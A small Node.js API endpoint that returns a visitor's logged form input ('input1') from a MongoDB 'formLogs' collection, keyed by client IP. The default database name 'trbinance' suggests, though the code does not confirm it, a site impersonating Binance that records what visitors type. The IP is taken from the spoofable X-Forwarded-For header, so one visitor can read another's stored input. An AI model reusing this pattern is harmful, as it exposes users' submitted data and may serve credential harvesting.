const clientPromise = require('../lib/mongo');

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const ip = getClientIp(req);

    if (!ip || ip === 'unknown') {
      return res.status(200).json({ input1: null });
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');

    const log = await logs.findOne({ ip }, { projection: { input1: 1 } });

    return res.status(200).json({ input1: log?.input1 || null });
  } catch (err) {
    console.error('User log API error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};

